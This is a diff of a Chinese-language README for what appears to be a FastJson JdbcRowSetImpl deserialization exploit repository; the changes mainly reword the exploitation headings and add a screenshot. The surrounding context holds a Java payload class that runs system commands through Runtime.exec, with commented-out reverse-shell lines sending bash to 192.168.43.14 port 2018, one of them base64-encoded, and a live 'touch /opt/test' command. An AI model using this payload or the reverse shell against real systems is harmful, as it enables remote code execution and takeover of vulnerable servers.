@@ -15,9 +15,9 @@ root@Bearcat:/# wget "https://github.com/iBearcat/FastJson-JdbcRowSetImpl/raw/ma
 
 ## 漏洞利用
 
-### CommandObject.java
+### 在CommandObject.java中构造commands命令数组
 
-### javac CommandObject.java
+### 编译 javac CommandObject.java
 
 ```
 import	java.lang.Runtime;
@@ -29,7 +29,7 @@ public class CommandObject {
 			//Runtime.getRuntime().exec("/bin/bash -i >&/dev/tcp/192.168.43.14/2018<&1");
 			//String[] commands = {"bash -c {echo,L2Jpbi9iYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC40My4xNC8yMDE4PCYx}|{base64,-d}|{bash,-i}"};
 			
-			String[] commands = {"touch","/opt/test"};
+			String[] commands = {"touch","/opt/test"}; //Command
 			Process	pc = rt.exec(commands);
 			pc.waitFor();
         }catch(Exception e){
@@ -41,6 +41,8 @@ public class CommandObject {
     }
 }
 ```
+
+![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/3.jpg?raw=true)
 
 ### 开启一个HTTP服务
 
